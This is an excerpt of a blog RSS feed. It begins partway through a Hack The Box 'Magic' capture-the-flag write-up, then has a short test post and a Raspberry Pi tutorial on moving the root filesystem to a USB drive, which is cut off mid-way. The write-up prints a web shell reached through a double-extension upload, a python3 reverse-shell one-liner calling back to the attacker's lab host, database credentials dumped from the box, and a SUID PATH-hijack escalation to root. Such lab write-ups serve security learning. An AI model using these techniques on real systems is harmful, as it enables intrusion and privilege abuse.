&lt;p&gt;[&amp;hellip;] a file named filename.php.123, will be interpreted as a PHP file by Apache HTTP Server, and it will be executed. This of course, will only work if the last extension (in this case .123), is not specified in the list of MIME-types known to the web server&amp;hellip;If AddHandler directive is used, all filenames containing the .php extension ( .php, .php.jpg) will be executed as a PHP script.&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can then proudly save our file from above under the name &lt;code&gt;fake-img.php.jpg&lt;/code&gt; and it should do the trick!&lt;/p&gt;
&lt;p&gt;Once uploaded, let&amp;rsquo;s try to GET it using &lt;code&gt;curl&lt;/code&gt; and a simple system command like &lt;code&gt;id&lt;/code&gt; as an argument:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl &#39;http://10.10.10.185/images/uploads/fake-img.php.jpg/cmd=id&#39;
ï¿½ï¿½ï¿½ï¿½
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It works! This means we can probably get a shell as user &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After having tried (and failed) to launch a &lt;strong&gt;netcat&lt;/strong&gt; reverse shell (probably not installed), we succesfully got a shell by passing to the &lt;code&gt;cmd&lt;/code&gt; argument (using Burp, because URL-encoding, because bash, because why not) the python3 one-liner from &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;PentestMonkey&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.18&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;kali@kali:~$ nc -nlvp 1234
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.185] 37956
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in! ðð»&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;user&#34;&gt;User&lt;/h1&gt;
&lt;p&gt;Once we&amp;rsquo;re in, we might want to do some lateral movement&amp;hellip; Indeed, the &lt;code&gt;user.txt&lt;/code&gt; flag is in &lt;code&gt;/home/theseus&lt;/code&gt; and is only readable by the &lt;code&gt;theseus&lt;/code&gt; user.&lt;/p&gt;
&lt;h3 id=&#34;mysql-credentials&#34;&gt;MySQL Credentials&lt;/h3&gt;
&lt;p&gt;At the server root, we find a file &lt;code&gt;db.php5&lt;/code&gt; containing the MySQL credentials.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/var/www/Magic$ cat db.php5
&amp;lt;?php
class Database
{
    private static $dbName = &#39;Magic&#39; ;
    private static $dbHost = &#39;localhost&#39; ;
    private static $dbUsername = &#39;theseus&#39;;
    private static $dbUserPassword = &#39;iamkingtheseus&#39;;
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But as you remember from above, we already have mapped the entire database, and the only useful information we found were the credentials of &lt;code&gt;admin&lt;/code&gt; for the login portal.&lt;/p&gt;
&lt;p&gt;Moreover, the binary &lt;code&gt;mysql&lt;/code&gt; (the MySQL CLI client) didn&amp;rsquo;t seem to be installed on the box, or might have been renamed, so I didn&amp;rsquo;t bother to take a second look at the database. I should have..&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I spent some unbelievable amount of time wondering why the only credentials I found associated with the user &amp;ldquo;theseus&amp;rdquo; (during the blind SQL dump) : &lt;code&gt;th3s3usw4sk1ng&lt;/code&gt; would not work with &lt;code&gt;su&lt;/code&gt;, and could not find any hint on how to get to this user account&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;dumping-the-database-wait-again&#34;&gt;Dumping the database (Wait? Again?)&lt;/h3&gt;
&lt;p&gt;This is where I decided to finally explore the MySQL database &amp;ldquo;manually&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;As said earlier, one can &lt;strong&gt;not&lt;/strong&gt; use the &lt;code&gt;mysql&lt;/code&gt; command line utility, which is missint from the the &lt;code&gt;/usr/bin&lt;/code&gt; directory, however we can connect to the DB using the same PHP logic as in &lt;code&gt;login.php&lt;/code&gt; or simply use the other tools from the MySQL package like &lt;code&gt;/usr/bin/mysqlshow&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:~$ mysqlshow -u &#39;theseus&#39; -p&#39;iamkingtheseus&#39;
mysqlshow: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or (better)  &lt;code&gt;/usr/bin/mysqldump&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:~$ mysqldump -u &#39;theseus&#39; -p&#39;iamkingtheseus&#39; Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-05-21 14:30:30
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this complete dump of the &amp;ldquo;&lt;code&gt;Magic&lt;/code&gt;&amp;rdquo; database, we find one line that could be interesting to us&amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is where I ð¤¦ââï¸, having totally forgot that MySQL string comparisons are case-insensitive.&lt;/p&gt;
&lt;h3 id=&#34;using-su&#34;&gt;Using su&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/$ su theseus 
Password: Th3s3usW4sK1ng
theseus@ubuntu:/$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So from the beggining, we had the correct password. Well. Almost the correct password&amp;hellip; ð¤·ââï¸&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root&#34;&gt;Root&lt;/h1&gt;
&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;To get root, we didn&amp;rsquo;t need to look very far, we started our manual enumeration, like listing the files owned by &lt;code&gt;root&lt;/code&gt; and writable by &lt;code&gt;theseus&lt;/code&gt; or listening with &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34;&gt;pspy64&lt;/a&gt; for potential cron jobs executed by &lt;code&gt;root&lt;/code&gt;. But didn&amp;rsquo;t find any.&lt;/p&gt;
&lt;p&gt;Eventually, we listed the SUID programs and found one (&lt;code&gt;sysinfo&lt;/code&gt;) that triggered our interest:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is even more interesting as it is the &lt;strong&gt;only&lt;/strong&gt; file on the machine which is owned by the group &amp;lsquo;users&amp;rsquo;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ find / -group user -ls 2&amp;gt;/dev/null
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a compiled binary, and we might want to use tools like &lt;a href=&#34;https://ghidra-sre.org/&#34;&gt;Ghidra&lt;/a&gt; or &lt;a href=&#34;http://cutter.re/&#34;&gt;Cutter.re&lt;/a&gt; to reverse-engineer it (that&amp;rsquo;s generaly the easiest way, once you know how to properly use these tools), but you could just also run it and from its output guessing that it must call some system functions to display system information and data.&lt;/p&gt;
&lt;p&gt;By looking at the output of pspy64 while you run &lt;code&gt;/bin/sysinfo&lt;/code&gt; you can actually see what system function the binary is calling, behind the hood:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2020/05/22 00:41:19 CMD: UID=0    PID=6010   | sysinfo 
2020/05/22 00:41:19 CMD: UID=0    PID=6012   | lshw -short 
2020/05/22 00:41:19 CMD: UID=0    PID=6011   | sh -c lshw -short 
2020/05/22 00:41:20 CMD: UID=0    PID=6017   | fdisk -l 
2020/05/22 00:41:20 CMD: UID=0    PID=6016   | sh -c fdisk -l 
2020/05/22 00:41:21 CMD: UID=0    PID=6021   | free -h 
2020/05/22 00:41:21 CMD: UID=0    PID=6020   | sh -c free -h 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We observe that a few processes are spawned as &lt;code&gt;root&lt;/code&gt;, namely &lt;code&gt;lshw&lt;/code&gt;, &lt;code&gt;fdisk&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt;. The binary is actually just calling them and displaying their output (as root).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Reverse-engineering the binary would also have showed that it was displaying the content of &lt;code&gt;/proc/cpuinfo&lt;/code&gt; using &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;exploiting-the-binsysinfo-binary&#34;&gt;Exploiting the /bin/sysinfo binary&lt;/h3&gt;
&lt;p&gt;The real issue here, is that the program is calling these above-mentioned functions in a non-safe way, i.e it is not using their fully defined paths:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/usr/bin/lshw&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/sbin/fdisk&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/bin/free&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hence, we could hijack the execution of this binary, by replacing one of this binary by one with &lt;strong&gt;the same name&lt;/strong&gt; somewhere above in our PATH. User &lt;code&gt;theseus&lt;/code&gt; executes this program as root, indeed, but these functions are still called relative to the &lt;code&gt;theseus&lt;/code&gt; environment (including its &lt;code&gt;$PATH&lt;/code&gt;) variable.&lt;/p&gt;
&lt;p&gt;Hence we can just create a bash script called &amp;ldquo;&lt;code&gt;free&lt;/code&gt;&amp;rdquo; in our home directory &lt;code&gt;/home/theseus/&lt;/code&gt; containing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Rooted!&amp;#34;&lt;/span&gt;
/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;And place our home directory at the top of our PATH:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ export PATH=/home/theseus:$PATH
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now when we execute sysinfo, we get a nice surprise:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;theseus@ubuntu:~$ sysinfo
[...]
===============MEM Usage===============
root@ubuntu:~$ id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;We&amp;rsquo;re root!&lt;/strong&gt; â ï¸&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Double Extension + Magic Bytes trick: &lt;a href=&#34;https://davidhamann.de/2019/12/04/htb-writeup-networked/&#34;&gt;https://davidhamann.de/2019/12/04/htb-writeup-networked/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;What is SUID/SGID: &lt;a href=&#34;https://docstore.mik.ua/orelly/other/puis3rd/0596003234_puis3-chp-6-sect-5.html&#34;&gt;https://docstore.mik.ua/orelly/other/puis3rd/0596003234_puis3-chp-6-sect-5.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Privesc through modifying PATH variable: &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&#34;&gt;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://www.acunetix.com/websitesecurity/upload-forms-threat/&#34;&gt;https://www.acunetix.com/websitesecurity/upload-forms-threat/&lt;/a&gt; &lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://alexconnat.github.io/categories/hacking/">Hacking</category>
                                
                            
                                
                                
                                
                                    <category domain="https://alexconnat.github.io/categories/write-ups/">Write-Ups</category>
                                
                            
                                
                                
                                
                                    <category domain="https://alexconnat.github.io/categories/htb/">HTB</category>
                                
                            
                        
                    
                        
                    
                
            </item>
        
            <item>
                <title>Hello World</title>
                <link>https://alexconnat.github.io/posts/hello-world/</link>
                <guid isPermaLink="true">https://alexconnat.github.io/posts/hello-world/</guid>
                <pubDate>Tue, 19 May 2020 18:47:52 &#43;0200</pubDate>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright>
                
                    <description>&lt;h1 id=&#34;hello-world-&#34;&gt;Hello World ð&lt;/h1&gt;
&lt;h3 id=&#34;just-a-test&#34;&gt;Just a test&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Is everything working&amp;hellip;?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Is this &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;working&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;?
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;It &lt;strong&gt;seems&lt;/strong&gt; like so!&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                    
                        
                    
                
            </item>
        
            <item>
                <title>Tutorial: How to move the rootfs partition on a Raspberry Pi to a USB flash drive</title>
                <link>https://alexconnat.github.io/posts/move-rootfs-partition-to-usb-drive-on-rpi/</link>
                <guid isPermaLink="true">https://alexconnat.github.io/posts/move-rootfs-partition-to-usb-drive-on-rpi/</guid>
                <pubDate>Tue, 19 Nov 2019 18:00:00 &#43;0200</pubDate>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright>
                
                    <description>&lt;p&gt;I own a Raspberry Pi 3 model B+ and I came across a problem that I didn&amp;rsquo;t see that often: I wanted to move the rootfs partition (that is to say, the location on which the root filesystem is physically located) from the SD card, to a USB flash drive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NB:&lt;/strong&gt; In this tutorial, I do not change the boot mode of the Raspberry Pi, meaning that it will &lt;strong&gt;still&lt;/strong&gt; boot from the SD card, but it will mount the linux filesystem on the USB drive.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A Raspberry Pi traditionally boots from a SD card, and has two partitions on this card: the &lt;code&gt;boot&lt;/code&gt; partition (quite small) and the &lt;code&gt;rootfs&lt;/code&gt; partition (that takes up the remaining storage space of the SD card). I wanted to move this rootfs partition to the USB drive, to make use of its bigger storage space.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In my case, when I bought and set up my RPi, I just used an old 2GB SD card, and I thought it would be enough to support a light operating system like Raspbian. Unfortunately, I quickly realised that to store additional binaries and install some more libraries (thus, creating files in &lt;code&gt;/opt&lt;/code&gt;, in &lt;code&gt;/etc&lt;/code&gt; and some additional log files in &lt;code&gt;/var/log&lt;/code&gt;), my 2 Gigabytes were not enough&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You can plug a USB drive, or an external drive to increase your storage space (for instance, for storing pictures, or movies), but this will never &lt;strong&gt;replace&lt;/strong&gt; having a bigger rootfs partition, i.e more space for the OS to use. As I only found very few references online that showed the steps to do so, I decided to write my own tutorial.&lt;/p&gt;
&lt;p&gt;I had this useless 16GB USB drive lying around, and I thought it would be the perfect candidate to replace this old 2GB SD card.&lt;/p&gt;
&lt;p&gt;Without further ado, let&amp;rsquo;s jump straight in! Here are the steps I followed:&lt;/p&gt;
&lt;h3 id=&#34;1-turn-on-your-rpi-with-only-the-sd-card-plugged-in&#34;&gt;1) Turn on your RPi with only the SD Card plugged in&lt;/h3&gt;
&lt;p&gt;Till now, no big deal. It should boot normally, as you&amp;rsquo;re used to.&lt;/p&gt;
&lt;h3 id=&#34;2-plug-your-empty-drive-inside-the-rpi&#34;&gt;2) Plug your (empty) drive inside the RPi&lt;/h3&gt;
&lt;p&gt;You can list the disks using the command &lt;code&gt;lsblk&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It should be recognized as &lt;code&gt;/dev/sda&lt;/code&gt;, and (if you never used it) should only have 1 full partition: &lt;code&gt;/dev/sda1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If it&amp;rsquo;s a USB drive or an external drive that you already used, you can wipe it and format it, but it shouldn&amp;rsquo;t make a difference as the next step will wipe it and format it anyways!&lt;/p&gt;
&lt;h3 id=&#34;3-backup-your-current-filesystem-from-the-sd-card-to-the-new-drive-using-dd&#34;&gt;3) Backup your current filesystem from the SD card to the new drive using &lt;code&gt;dd&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;dd if=/dev/mmcblk0 of=/dev/sda bs=4M status=progress
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This command will copy the whole state and content of your current filesystem from the SD card to your newly plugged drive. It could take some time to complete.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As a sanity check: if you run &lt;code&gt;lsblk&lt;/code&gt; and &lt;code&gt;sudo blkid&lt;/code&gt;, you should now see that &lt;code&gt;/dev/sda1&lt;/code&gt; and &lt;code&gt;/dev/sda2&lt;/code&gt; on your USB drive perfectly replicate the &lt;u&gt;boot&lt;/u&gt; and &lt;u&gt;rootfs&lt;/u&gt; partitions &lt;code&gt;/dev/mmcblk0p0&lt;/code&gt; and &lt;code&gt;/dev/mmcblk0p1&lt;/code&gt; from the SD card.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;WARNING:&lt;/strong&gt; There is (or might be) still be a problem: In most cases, &lt;code&gt;dd&lt;/code&gt; &lt;u&gt;exactly&lt;/u&gt; replicate the partitions, meaning that they might still have &lt;u&gt;the same PARTUUID&lt;/u&gt;&amp;hellip;
As its name indicates, this UUID needs to be.. well.. unique! The first reason being that it is &lt;em&gt;this ID&lt;/em&gt; that you give to the operating system while booting, in order to decide &lt;u&gt;which&lt;/u&gt; disk to use to mount the filesystem on.&lt;/p&gt;
&lt;h3 id=&#34;4-change-the-partuuid-of-devsda-using-fdisk&#34;&gt;4) Change the PARTUUID of &lt;code&gt;/dev/sda&lt;/code&gt; using &lt;code&gt;fdisk&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;In my case, the PARTUUID for both disks was &lt;code&gt;9b1c6f5e&lt;/code&gt;. I will change the one from my USB drive to &lt;code&gt;d3adb33f&lt;/code&gt; (because why not) using the advanced options of the cmd line utility &lt;code&gt;fdisk&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo fdisk /dev/sda
x  # expert options
i  # change the disk identifier
&amp;lt;enter the new partuuid in decimal&amp;gt; (here we enter 3551376191, the decimal value of 0xd3adb33f)
r
w
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5-change-the-rootfs-partuuid-in-bootcmdlinetxt&#34;&gt;5) Change the rootfs PARTUUID in &lt;code&gt;/boot/cmdline.txt&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;This file, in &lt;code&gt;/boot&lt;/code&gt; (the boot partition on the SD card) tells the system to mount the linux root filesystem on the disk with given PARTUUID.&lt;/p&gt;
&lt;p&gt;So, in this file, instead of:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=9b1c6f5e-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We will write:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=d3adb33f-02 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Just in case you want to revert your initial configuration, you can save the old cmdline file as &lt;code&gt;cmdline.txt.bak&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;6-reboot-the-rpi&#34;&gt;6) Reboot the RPi&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo reboot
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will safely reboot the device. It will boot from the SD card (as always), but then, mount the root filesystem onto your new USB drive, as intended. From now on, make sure to leave it plugged at all time on the same USB port.&lt;/p&gt;
&lt;h3 id=&#34;7-expand-the-filesystem-partition&#34;&gt;7) Expand the filesystem partition&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Last little problem: Our SD card was &lt;strong&gt;2GB&lt;/strong&gt;, and &lt;code&gt;dd&lt;/code&gt; copied it &lt;u&gt;identically&lt;/u&gt;, making the new partition on the USB drive.. also 2GB! We want to expand our partition so that it occupies all the (e.g 16GB) of our USB drive&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is an option to do that in &lt;code&gt;raspi-config&lt;/code&gt; : If you go to &amp;ldquo;Advanced Options &amp;gt; Expand Filesystem&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;However, you should get a warning &lt;em&gt;&amp;quot;/dev/sda is not on a SD card, cannot expand filesystem&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This is because the name of partition for the SD card is hardcoded in the &lt;code&gt;raspi-config&lt;/code&gt; script, and that you&amp;rsquo;re not supposed to mount your filesystem on something &lt;strong&gt;else&lt;/strong&gt;. However, we can circumvent this limitation by just running a few lines:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /usr/bin/raspi-config ~    						# Copy the raspi-config script in your home folder
sed -i &#39;s/mmcblk0p/sda/&#39; ~/raspi-config
sed -i &#39;s/mmcblk0/sda/&#39; ~/raspi-config    # Substitute mmcblk0 for sda everywhere
sudo ~/raspi-config                       # Run it, and Profit :)
